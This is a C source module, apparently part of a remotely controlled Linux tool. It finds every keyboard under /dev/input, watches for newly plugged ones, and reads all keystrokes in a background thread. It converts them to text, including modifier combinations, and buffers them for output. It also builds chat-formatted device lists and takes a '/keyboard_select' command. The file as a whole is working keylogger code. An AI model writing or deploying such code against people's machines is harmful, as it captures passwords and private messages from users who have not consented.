/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "keyboard.h"
#include "keyboard_output.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"

#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/input.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define test_bit(bit, array) ((array)[(bit) / 8] & (1 << ((bit) % 8)))
#define MAX_KEYBOARD_DEVICES 32

typedef struct {
    int fd;
    char path[256];
    char name[256];
} keyboard_device_t;

static pthread_t listener_thread;
static int listener_started;
static volatile int stopping;
static pthread_mutex_t devices_lock = PTHREAD_MUTEX_INITIALIZER;
static char selected_target[256] = "all";
static int selected_index = -1; /* -1 = all, >= 0 = index, -2 = string */
static keyboard_device_t active_devices[MAX_KEYBOARD_DEVICES];
static int active_device_count;

static const char *c2t_strcasestr(const char *haystack, const char *needle)
{
    if (!haystack || !needle) return nullptr;
    if (!*needle) return haystack;
    size_t needle_len = strlen(needle);
    for (; *haystack; haystack++) {
        if (strncasecmp(haystack, needle, needle_len) == 0) {
            return haystack;
        }
    }
    return nullptr;
}

static int is_device_selected_locked(int index, const char *path, const char *name)
{
    if (selected_index == -1 || strcmp(selected_target, "all") == 0 || strcmp(selected_target, "*") == 0)
        return 1;
    if (selected_index >= 0 && selected_index == index)
        return 1;
    if (path && strcmp(selected_target, path) == 0)
        return 1;
    if (path) {
        const char *slash = strrchr(path, '/');
        if (slash && strcmp(slash + 1, selected_target) == 0)
            return 1;
    }
    if (name && c2t_strcasestr(name, selected_target) != nullptr)
        return 1;
    return 0;
}


static int shift_active;
static int caps_lock_active;
static int ctrl_active;
static int alt_active;
static int meta_active;

static int is_keyboard(const char *devpath)
{
    int fd = open(devpath, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0)
        return 0;

    unsigned char evbits[EV_MAX / 8 + 1] = {0};
    unsigned char keybits[KEY_MAX / 8 + 1] = {0};

    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbits)), evbits) < 0) {
        close(fd);
        return 0;
    }

    int result = 0;
    if (test_bit(EV_KEY, evbits)) {
        if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybits)), keybits) >= 0) {
            if (test_bit(KEY_A, keybits) && test_bit(KEY_Z, keybits) &&
                test_bit(KEY_ENTER, keybits) && test_bit(KEY_SPACE, keybits)) {
                result = 1;
            }
        }
    }

    close(fd);
    return result;
}

static void translate_and_emit_key(uint32_t key, int ev_value)
{
    int pressed = (ev_value != 0);
    int is_initial_press = (ev_value == 1);

    if (key == KEY_LEFTSHIFT || key == KEY_RIGHTSHIFT) {
        shift_active = pressed;
        return;
    }
    if (key == KEY_LEFTCTRL || key == KEY_RIGHTCTRL) {
        ctrl_active = pressed;
        return;
    }
    if (key == KEY_LEFTALT || key == KEY_RIGHTALT) {
        alt_active = pressed;
        return;
    }
    if (key == KEY_LEFTMETA || key == KEY_RIGHTMETA) {
        meta_active = pressed;
        return;
    }
    if (key == KEY_CAPSLOCK) {
        if (is_initial_press) {
            caps_lock_active = !caps_lock_active;
        }
        return;
    }

    if (!pressed)
        return;

    char key_label[32];
    int is_special = 0;
    int is_printable = 0;

    if (key >= KEY_1 && key <= KEY_9) {
        static const char shift_num[] = "!@#$%^&*(";
        char ch = shift_active ? shift_num[key - KEY_1] : (char)('1' + (key - KEY_1));
        key_label[0] = ch;
        key_label[1] = '\0';
        is_printable = 1;
    } else if (key == KEY_0) {
        key_label[0] = shift_active ? ')' : '0';
        key_label[1] = '\0';
        is_printable = 1;
    } else if (key >= KEY_Q && key <= KEY_P) {
        static const char *row1 = "qwertyuiop";
        char ch = row1[key - KEY_Q];
        int uppercase = shift_active ^ caps_lock_active;
        if (uppercase && ch >= 'a' && ch <= 'z') ch -= 32;
        key_label[0] = ch;
        key_label[1] = '\0';
        is_printable = 1;
    } else if (key >= KEY_A && key <= KEY_L) {
        static const char *row2 = "asdfghjkl";
        char ch = row2[key - KEY_A];
        int uppercase = shift_active ^ caps_lock_active;
        if (uppercase && ch >= 'a' && ch <= 'z') ch -= 32;
        key_label[0] = ch;
        key_label[1] = '\0';
        is_printable = 1;
    } else if (key >= KEY_Z && key <= KEY_M) {
        static const char *row3 = "zxcvbnm";
        char ch = row3[key - KEY_Z];
        int uppercase = shift_active ^ caps_lock_active;
        if (uppercase && ch >= 'a' && ch <= 'z') ch -= 32;
        key_label[0] = ch;
        key_label[1] = '\0';
        is_printable = 1;
    } else if (key >= KEY_F1 && key <= KEY_F10) {
        snprintf(key_label, sizeof(key_label), "F%u", key - KEY_F1 + 1);
        is_special = 1;
    } else if (key == KEY_F11) {
        snprintf(key_label, sizeof(key_label), "F11");
        is_special = 1;
    } else if (key == KEY_F12) {
        snprintf(key_label, sizeof(key_label), "F12");
        is_special = 1;
    } else if (key >= KEY_F13 && key <= KEY_F24) {
        snprintf(key_label, sizeof(key_label), "F%u", key - KEY_F13 + 13);
        is_special = 1;
    } else {
        switch (key) {
        case KEY_ENTER:
        case KEY_KPENTER:
            key_label[0] = '\n';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_SPACE:
            key_label[0] = ' ';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_TAB:
            key_label[0] = '\t';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_BACKSPACE:
            snprintf(key_label, sizeof(key_label), "BS");
            is_special = 1;
            break;
        case KEY_ESC:
            snprintf(key_label, sizeof(key_label), "ESC");
            is_special = 1;
            break;
        case KEY_DELETE:
            snprintf(key_label, sizeof(key_label), "Del");
            is_special = 1;
            break;
        case KEY_INSERT:
            snprintf(key_label, sizeof(key_label), "Ins");
            is_special = 1;
            break;
        case KEY_HOME:
            snprintf(key_label, sizeof(key_label), "Home");
            is_special = 1;
            break;
        case KEY_END:
            snprintf(key_label, sizeof(key_label), "End");
            is_special = 1;
            break;
        case KEY_PAGEUP:
            snprintf(key_label, sizeof(key_label), "PgUp");
            is_special = 1;
            break;
        case KEY_PAGEDOWN:
            snprintf(key_label, sizeof(key_label), "PgDn");
            is_special = 1;
            break;
        case KEY_UP:
            snprintf(key_label, sizeof(key_label), "Up");
            is_special = 1;
            break;
        case KEY_DOWN:
            snprintf(key_label, sizeof(key_label), "Down");
            is_special = 1;
            break;
        case KEY_LEFT:
            snprintf(key_label, sizeof(key_label), "Left");
            is_special = 1;
            break;
        case KEY_RIGHT:
            snprintf(key_label, sizeof(key_label), "Right");
            is_special = 1;
            break;
        case KEY_PRINT:
        case KEY_SYSRQ:
            snprintf(key_label, sizeof(key_label), "PrtScn");
            is_special = 1;
            break;
        case KEY_PAUSE:
            snprintf(key_label, sizeof(key_label), "Pause");
            is_special = 1;
            break;
        case KEY_SCROLLLOCK:
            snprintf(key_label, sizeof(key_label), "ScrollLock");
            is_special = 1;
            break;
        case KEY_NUMLOCK:
            snprintf(key_label, sizeof(key_label), "NumLock");
            is_special = 1;
            break;
        case KEY_MINUS:
            key_label[0] = shift_active ? '_' : '-';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_EQUAL:
            key_label[0] = shift_active ? '+' : '=';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_LEFTBRACE:
            key_label[0] = shift_active ? '{' : '[';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_RIGHTBRACE:
            key_label[0] = shift_active ? '}' : ']';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_SEMICOLON:
            key_label[0] = shift_active ? ':' : ';';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_APOSTROPHE:
            key_label[0] = shift_active ? '"' : '\'';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_GRAVE:
            key_label[0] = shift_active ? '~' : '`';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_BACKSLASH:
            key_label[0] = shift_active ? '|' : '\\';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_COMMA:
            key_label[0] = shift_active ? '<' : ',';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_DOT:
            key_label[0] = shift_active ? '>' : '.';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_SLASH:
            key_label[0] = shift_active ? '?' : '/';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_102ND:
            key_label[0] = shift_active ? '>' : '<';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_KP0: case KEY_KP1: case KEY_KP2: case KEY_KP3: case KEY_KP4:
        case KEY_KP5: case KEY_KP6: case KEY_KP7: case KEY_KP8: case KEY_KP9:
            key_label[0] = (char)('0' + (key - KEY_KP0));
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_KPDOT:
        case KEY_KPCOMMA:
            key_label[0] = '.';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_KPPLUS:
            key_label[0] = '+';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_KPMINUS:
            key_label[0] = '-';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_KPASTERISK:
            key_label[0] = '*';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_KPSLASH:
            key_label[0] = '/';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        case KEY_KPEQUAL:
            key_label[0] = '=';
            key_label[1] = '\0';
            is_printable = 1;
            break;
        default:
            break;
        }
    }

    if (!is_special && !is_printable)
        return;

    int has_modifier = ctrl_active || alt_active || meta_active;
    if (has_modifier && key_label[0] != '\n') {
        char mod_buf[96];
        int offset = snprintf(mod_buf, sizeof(mod_buf), "[");
        if (ctrl_active) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Ctrl+");
        if (alt_active) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Alt+");
        if (meta_active) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Super+");
        if (shift_active && !is_printable) offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Shift+");
        offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "%s]", key_label);
        if (offset > 0 && (size_t)offset < sizeof(mod_buf)) {
            keyboard_output_append(mod_buf, (size_t)offset);
        }
    } else if (is_special) {
        char spec_buf[48];
        int spec_len = snprintf(spec_buf, sizeof(spec_buf), "[%s]", key_label);
        if (spec_len > 0) {
            keyboard_output_append(spec_buf, (size_t)spec_len);
        }
    } else if (is_printable) {
        keyboard_output_append(key_label, strlen(key_label));
    }
}

static void add_device(keyboard_device_t *devices, int *count, const char *path)
{
    if (*count >= MAX_KEYBOARD_DEVICES)
        return;

    for (int i = 0; i < *count; i++) {
        if (strcmp(devices[i].path, path) == 0)
            return;
    }

    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
        c2t_log_debug("keyboard", "Unable to open %s: %s", path, strerror(errno));
        return;
    }

    char name[256] = "Unknown";
    (void)ioctl(fd, EVIOCGNAME(sizeof(name)), name);

    devices[*count].fd = fd;
    snprintf(devices[*count].path, sizeof(devices[*count].path), "%s", path);
    snprintf(devices[*count].name, sizeof(devices[*count].name), "%s", name);
    (*count)++;

    pthread_mutex_lock(&devices_lock);
    if (*count <= MAX_KEYBOARD_DEVICES) {
        active_devices[*count - 1] = devices[*count - 1];
        active_device_count = *count;
    }
    pthread_mutex_unlock(&devices_lock);

    c2t_log_info("keyboard", "Listening on keyboard device: %s (%s)", path, name);
}

static void remove_device(keyboard_device_t *devices, int *count, int index)
{
    if (index < 0 || index >= *count)
        return;

    c2t_log_info("keyboard", "Keyboard device disconnected: %s", devices[index].path);
    close(devices[index].fd);

    for (int i = index; i < *count - 1; i++) {
        devices[i] = devices[i + 1];
    }
    (*count)--;

    pthread_mutex_lock(&devices_lock);
    for (int i = 0; i < *count; i++) {
        active_devices[i] = devices[i];
    }
    active_device_count = *count;
    pthread_mutex_unlock(&devices_lock);
}

static int scan_and_attach_keyboards(keyboard_device_t *devices, int *count)
{
    const char *dir = "/dev/input";
    DIR *d = opendir(dir);
    if (!d) {
        c2t_log_error("keyboard", "Unable to open %s: %s", dir, strerror(errno));
        return 0;
    }

    struct dirent *entry;
    char path[256];

    while ((entry = readdir(d)) != nullptr) {
        if (strncmp(entry->d_name, "event", 5) != 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", dir, entry->d_name);

        if (is_keyboard(path)) {
            add_device(devices, count, path);
        }
    }

    closedir(d);
    return *count;
}

static void handle_hotplug(keyboard_device_t *devices, int *count, int inotify_fd)
{
    char buf[1024] __attribute__((aligned(__alignof__(struct inotify_event))));
    ssize_t len = read(inotify_fd, buf, sizeof(buf));
    if (len <= 0)
        return;

    const struct inotify_event *event;
    for (char *ptr = buf; ptr < buf + len;
         ptr += sizeof(struct inotify_event) + event->len) {
        event = (const struct inotify_event *)ptr;
        if (event->len > 0 && strncmp(event->name, "event", 5) == 0) {
            char path[256];
            snprintf(path, sizeof(path), "/dev/input/%s", event->name);
            if (is_keyboard(path)) {
                add_device(devices, count, path);
            }
        }
    }
}

int keyboard_listen(void)
{
    keyboard_device_t devices[MAX_KEYBOARD_DEVICES];
    int device_count = 0;

    scan_and_attach_keyboards(devices, &device_count);
    if (device_count == 0) {
        c2t_log_warning("keyboard", "No keyboard devices currently found in /dev/input");
    }

    int inotify_fd = inotify_init1(IN_NONBLOCK | IN_CLOEXEC);
    if (inotify_fd >= 0) {
        (void)inotify_add_watch(inotify_fd, "/dev/input", IN_CREATE | IN_ATTRIB);
    }

    int stop_fd = c2t_runtime_stop_descriptor();

    while (!stopping && !c2t_runtime_stop_requested()) {
        struct pollfd pfds[MAX_KEYBOARD_DEVICES + 2];
        int nfds = 0;

        for (int i = 0; i < device_count; i++) {
            pfds[nfds].fd = devices[i].fd;
            pfds[nfds].events = POLLIN;
            pfds[nfds].revents = 0;
            nfds++;
        }

        int inotify_idx = -1;
        if (inotify_fd >= 0) {
            inotify_idx = nfds++;
            pfds[inotify_idx].fd = inotify_fd;
            pfds[inotify_idx].events = POLLIN;
            pfds[inotify_idx].revents = 0;
        }

        int stop_idx = -1;
        if (stop_fd >= 0) {
            stop_idx = nfds++;
            pfds[stop_idx].fd = stop_fd;
            pfds[stop_idx].events = POLLIN;
            pfds[stop_idx].revents = 0;
        }

        int n = poll(pfds, (nfds_t)nfds, 1000);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            c2t_log_error("keyboard", "poll() failed: %s", strerror(errno));
            break;
        }

        if (stopping || c2t_runtime_stop_requested())
            break;

        if (n == 0)
            continue;

        if (stop_idx >= 0 && (pfds[stop_idx].revents & POLLIN))
            break;

        if (inotify_idx >= 0 && (pfds[inotify_idx].revents & POLLIN)) {
            handle_hotplug(devices, &device_count, inotify_fd);
        }

        for (int i = device_count - 1; i >= 0; i--) {
            if (pfds[i].revents & (POLLHUP | POLLERR | POLLNVAL)) {
                remove_device(devices, &device_count, i);
                continue;
            }

            if (pfds[i].revents & POLLIN) {
                struct input_event events[32];
                ssize_t bytes = read(devices[i].fd, events, sizeof(events));
                if (bytes <= 0) {
                    if (bytes < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
                        continue;
                    remove_device(devices, &device_count, i);
                    continue;
                }

                pthread_mutex_lock(&devices_lock);
                int selected = is_device_selected_locked(i, devices[i].path, devices[i].name);
                pthread_mutex_unlock(&devices_lock);

                if (selected) {
                    size_t count = (size_t)bytes / sizeof(struct input_event);
                    for (size_t j = 0; j < count; j++) {
                        if (events[j].type == EV_KEY) {
                            translate_and_emit_key(events[j].code, events[j].value);
                        }
                    }
                }
            }
        }
    }

    for (int i = 0; i < device_count; i++) {
        close(devices[i].fd);
    }

    if (inotify_fd >= 0) {
        close(inotify_fd);
    }

    pthread_mutex_lock(&devices_lock);
    active_device_count = 0;
    pthread_mutex_unlock(&devices_lock);

    keyboard_output_flush();
    return 0;
}

static void *listener_worker([[maybe_unused]] void *context)
{
    (void)keyboard_listen();
    return nullptr;
}

int keyboard_listener_init(void)
{
    if (listener_started)
        return 1;

    stopping = 0;
    shift_active = 0;
    caps_lock_active = 0;
    ctrl_active = 0;
    alt_active = 0;
    meta_active = 0;

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 256 * 1024);
    listener_started = (pthread_create(&listener_thread, &attr, listener_worker, nullptr) == 0);
    pthread_attr_destroy(&attr);

    if (!listener_started) {
        c2t_log_error("keyboard", "Unable to start keyboard listener thread");
    }
    return listener_started;
}

void keyboard_listener_cleanup(void)
{
    if (!listener_started)
        return;

    stopping = 1;
    (void)pthread_join(listener_thread, nullptr);
    listener_started = 0;
}

int keyboard_get_device_list(char *buffer, size_t max_len)
{
    if (!buffer || max_len == 0)
        return 0;

    pthread_mutex_lock(&devices_lock);

    keyboard_device_t temp_devs[MAX_KEYBOARD_DEVICES];
    int count = 0;

    if (active_device_count > 0) {
        count = active_device_count;
        for (int i = 0; i < count; i++) {
            temp_devs[i] = active_devices[i];
        }
    } else {
        const char *dir = "/dev/input";
        DIR *d = opendir(dir);
        if (d) {
            struct dirent *entry;
            char path[256];
            while ((entry = readdir(d)) != nullptr && count < MAX_KEYBOARD_DEVICES) {
                if (strncmp(entry->d_name, "event", 5) != 0)
                    continue;
                snprintf(path, sizeof(path), "%s/%s", dir, entry->d_name);
                if (is_keyboard(path)) {
                    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
                    if (fd >= 0) {
                        char name[256] = "Unknown";
                        (void)ioctl(fd, EVIOCGNAME(sizeof(name)), name);
                        close(fd);
                        snprintf(temp_devs[count].path, sizeof(temp_devs[count].path), "%s", path);
                        snprintf(temp_devs[count].name, sizeof(temp_devs[count].name), "%s", name);
                        temp_devs[count].fd = -1;
                        count++;
                    }
                }
            }
            closedir(d);
        }
    }

    if (count == 0) {
        snprintf(buffer, max_len,
                 "⌨️ <b>Keyboard Devices:</b>\n\n"
                 "⚠️ <i>No keyboard devices found in /dev/input.</i>\n"
                 "(Check read permissions for /dev/input/event*)");
        pthread_mutex_unlock(&devices_lock);
        return 1;
    }

    size_t offset = (size_t)snprintf(buffer, max_len,
                                     "⌨️ <b>Detected Keyboard Devices (%d):</b>\n\n", count);

    for (int i = 0; i < count && offset + 128 < max_len; i++) {
        int active = is_device_selected_locked(i, temp_devs[i].path, temp_devs[i].name);
        offset += (size_t)snprintf(buffer + offset, max_len - offset,
                                  "• <b>[%d]</b> <code>%s</code>\n"
                                  "  🏷️ <i>%s</i> — %s\n",
                                  i,
                                  temp_devs[i].path,
                                  temp_devs[i].name[0] ? temp_devs[i].name : "Standard Keyboard",
                                  active ? "🟢 <b>ACTIVE</b>" : "⚪ <i>MUTED</i>");
    }

    if (offset + 128 < max_len) {
        snprintf(buffer + offset, max_len - offset,
                 "\n🎯 <b>Current Target:</b> <code>%s</code>\n"
                 "💡 <i>Select device with <code>/keyboard_select &lt;id|all&gt;</code></i>",
                 selected_target);
    }

    pthread_mutex_unlock(&devices_lock);
    return 1;
}

int keyboard_select_device(const char *target)
{
    pthread_mutex_lock(&devices_lock);
    if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
        selected_index = -1;
        snprintf(selected_target, sizeof(selected_target), "all");
    } else {
        int is_num = 1;
        for (const char *p = target; *p; p++) {
            if (!isdigit((unsigned char)*p)) {
                is_num = 0;
                break;
            }
        }
        if (is_num) {
            selected_index = atoi(target);
            snprintf(selected_target, sizeof(selected_target), "%d", selected_index);
        } else {
            selected_index = -2;
            snprintf(selected_target, sizeof(selected_target), "%s", target);
        }
    }
    pthread_mutex_unlock(&devices_lock);
    return 1;
}

void keyboard_get_selected_target(char *buffer, size_t max_len)
{
    if (!buffer || max_len == 0) return;
    pthread_mutex_lock(&devices_lock);
    snprintf(buffer, max_len, "%s", selected_target);
    pthread_mutex_unlock(&devices_lock);
}

int keyboard_get_device_count(void)
{
    pthread_mutex_lock(&devices_lock);
    int count = active_device_count;
    pthread_mutex_unlock(&devices_lock);
    return count;
}